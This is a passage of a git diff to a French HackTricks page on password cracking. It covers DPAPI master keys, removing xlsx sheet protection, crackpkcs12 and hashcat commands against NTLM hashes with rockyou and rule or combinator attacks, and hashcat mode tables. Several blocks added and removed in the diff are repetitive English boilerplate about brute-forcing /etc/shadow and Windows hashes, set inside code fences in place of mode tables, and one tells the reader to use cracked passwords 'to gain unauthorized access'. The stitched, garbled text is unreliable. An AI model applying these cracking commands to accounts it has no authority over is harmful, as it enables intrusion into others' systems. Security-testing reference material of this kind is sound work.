-<figure><img src="../.gitbook/assets/image (660).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (663).png" alt=""><figcaption></figcaption></figure>
 
 ### Clé maître DPAPI
 
@@ -809,7 +669,7 @@ Utilisez [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.
 Si vous avez un fichier xlsx avec une colonne protégée par un mot de passe, vous pouvez la déprotéger :
 
 * **Téléchargez-le sur Google Drive** et le mot de passe sera automatiquement supprimé
-* Pour le **supprimer** **manuellement** :
+* Pour le **supprimer** manuellement :
 ```bash
 unzip file.xlsx
 grep -R "sheetProtection" ./*
@@ -825,10 +685,10 @@ zip -r file.xls .
 # From https://github.com/crackpkcs12/crackpkcs12
 crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 ```
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire facilement et **automatiser des workflows** alimentés par les outils communautaires les plus avancés au monde.\
+Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour construire et **automatiser facilement** des flux de travail alimentés par les outils communautaires les plus avancés au monde.\
 Accédez dès aujourd'hui :
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -875,7 +735,7 @@ hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 * **Attaque de combinaison de listes de mots**
 
 Il est possible de **combiner 2 listes de mots en 1** avec hashcat.\
-Si la liste 1 contenait le mot **"hello"** et que la deuxième contenait 2 lignes avec les mots **"world"** et **"earth"**. Les mots `helloworld` et `helloearth` seront générés.
+Si la liste 1 contenait le mot **"hello"** et que la seconde contenait 2 lignes avec les mots **"world"** et **"earth"**. Les mots `helloworld` et `helloearth` seront générés.
 ```bash
 # This will combine 2 wordlists
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
@@ -934,27 +794,30 @@ hashcat --example-hashes | grep -B1 -A2 "NTLM"
 
 ### Introduction
 
-Brute forcing is a common technique used to crack passwords by systematically attempting all possible combinations of characters until the correct one is found. In the context of cracking Linux hashes from the `/etc/shadow` file, brute forcing involves trying different password combinations to find the one that matches the hashed password stored in the file.
+Brute forcing is a common technique used to crack passwords by systematically trying all possible combinations of characters until the correct one is found. In the context of cracking Linux hashes stored in the `/etc/shadow` file, brute forcing involves generating potential passwords, hashing them using the same algorithm as the stored hashes, and then comparing the results to find a match.
 
-### Tools
+### Tools and Resources
 
-There are various tools available for brute forcing passwords, such as John the Ripper, Hashcat, and Hydra. These tools can be used to automate the process of generating and testing password combinations against the hashed passwords in the `/etc/shadow` file.
+There are various tools and resources available for performing brute force attacks on Linux hashes. Some popular tools include:
+
+- **John the Ripper**: A powerful password-cracking tool that can be used for both dictionary-based and brute force attacks.
+- **Hashcat**: Another popular tool for password cracking that supports various hashing algorithms.
+- **Hydra**: A fast and flexible password-cracking tool that supports multiple protocols.
 
 ### Methodology
 
-1. **Obtain the Hash**: First, you need to obtain the hashed password from the `/etc/shadow` file on the target Linux system.
+The general methodology for brute forcing Linux hashes involves the following steps:
 
-2. **Select a Tool**: Choose a suitable password cracking tool like John the Ripper or Hashcat based on your requirements and the type of hash you are trying to crack.
-
-3. **Generate Password Combinations**: Use the selected tool to generate password combinations based on criteria such as character sets, length, and complexity.
-
-4. **Brute Force Attack**: Initiate the brute force attack using the tool, which will systematically test each generated password against the hashed password until a match is found.
-
-5. **Crack the Password**: Once the correct password is identified, you can use it to gain unauthorized access to the target system.
+1. **Obtain the Hash**: Extract the hashed passwords from the `/etc/shadow` file.
+2. **Choose a Tool**: Select a suitable password-cracking tool based on the hashing algorithm used.
+3. **Generate Password List**: Create a list of potential passwords to be used in the brute force attack.
+4. **Configure the Tool**: Set up the chosen tool with the hash to be cracked and the password list.
+5. **Initiate the Attack**: Start the brute force attack and wait for the tool to find the correct password.
+6. **Verify the Result**: Once the tool has found a match, verify the password and use it to gain unauthorized access.
 
 ### Conclusion
 
-Brute forcing Linux hashes from the `/etc/shadow` file can be a time-consuming process, especially for complex passwords. However, with the right tools and methodology, it is possible to crack hashed passwords and gain access to the target system.
+Brute forcing Linux hashes can be a time-consuming process, especially for complex passwords. However, with the right tools and techniques, it is possible to crack hashed passwords and gain access to sensitive information stored on Linux systems.
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
@@ -963,56 +826,42 @@ Brute forcing Linux hashes from the `/etc/shadow` file can be a time-consuming p
 ```
 ## Brute-Force
 
-### Description
+### Dictionary Attacks
 
-Brute-force attacks consist of systematically checking all possible keys or passwords until the correct one is found. This method is commonly used to crack Windows hashes.
+A dictionary attack is a technique for defeating a cipher or authentication mechanism by trying to determine its decryption key or passphrase by trying hundreds or sometimes millions of likely possibilities, such as words in a dictionary.
 
-### Tools
+### Brute-Force Attacks
 
-- **John the Ripper**: A popular password-cracking tool that can be used for brute-force attacks.
-- **Hashcat**: Another powerful tool for password cracking that supports various algorithms and attack types.
+A brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. The attacker systematically checks all possible passwords and passphrases until the correct one is found.
 
-### Techniques
+### Rainbow Tables
 
-1. **Dictionary Attack**: Involves using a predefined list of words as potential passwords.
-2. **Mask Attack**: Allows for customizing the brute-force attack by specifying the password's format.
-3. **Hybrid Attack**: Combines dictionary words with brute-force techniques to increase the chances of success.
-
-### Resources
-
-- [John the Ripper Documentation](https://www.openwall.com/john/doc/)
-- [Hashcat Wiki](https://hashcat.net/wiki/)
+Rainbow tables are precomputed tables used in recovering the plaintext password from a password hash generated by a hash function. Rainbow tables are often used in recovering passwords from hashes obtained during a penetration test or other security assessment.
 ```
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-## Brute-Force
+## Brute Forcing
 
-### Description
+### Introduction
 
-Brute-force attacks are a common method used to crack hashes. This technique involves trying all possible combinations of characters until the correct one is found. Brute-force attacks can be time-consuming but are effective against weak passwords.
+Brute forcing is a common technique used to crack hashes. It involves trying all possible combinations of characters until the correct one is found. This method is often used when other techniques, such as dictionary attacks, fail to crack the hash.
 
 ### Tools
 
+There are several tools available for brute forcing hashes, including:
+
 - **Hashcat**: A popular password cracking tool that supports multiple hashing algorithms.
-- **John the Ripper**: Another widely used password cracking tool that can perform brute-force attacks.
-- **Hydra**: A tool known for its ability to perform brute-force attacks on various protocols and services.
+- **John the Ripper**: Another widely used password cracking tool that can handle various hash types.
+- **Hydra**: A versatile password cracking tool that supports multiple protocols, including HTTP, SMB, FTP, etc.
 
 ### Methodology
 
-1. **Generate Wordlist**: Create a wordlist containing possible passwords based on common patterns, dictionaries, and rules.
-2. **Select Hash Algorithm**: Identify the hashing algorithm used to generate the hash.
-3. **Run Brute-Force Attack**: Use a password cracking tool to run a brute-force attack against the hash.
-4. **Optimize Attack**: Adjust the attack parameters, such as password length and character set, to improve efficiency.
-5. **Crack Hash**: Once the correct password is found, the hash is cracked, and the plaintext password is revealed.
+To brute force a hash using tools like Hashcat or John the Ripper, you typically need a wordlist containing potential passwords. The tool will then systematically try each password in the list until the correct one is found. Hydra, on the other hand, can perform brute force attacks against various protocols by trying different combinations of usernames and passwords.
 
-### Example
+### Conclusion
 
-```bash
-hashcat -m 0 hash.txt wordlist.txt
-```
-
-This command uses Hashcat to perform a brute-force attack (`-m 0`) against the hashes stored in `hash.txt` using the wordlist `wordlist.txt`.
+Brute forcing is a powerful technique for cracking hashes, especially when other methods prove unsuccessful. By using the right tools and methodologies, hackers can successfully recover passwords from hashed data.
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
@@ -1024,19 +873,19 @@ This command uses Hashcat to perform a brute-force attack (`-m 0`) against the h
 ```
 <details>
 
-<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
+<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
-D'autres façons de soutenir HackTricks :
+Autres façons de soutenir HackTricks:
 
-* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
 </details>
 
-<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
 Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
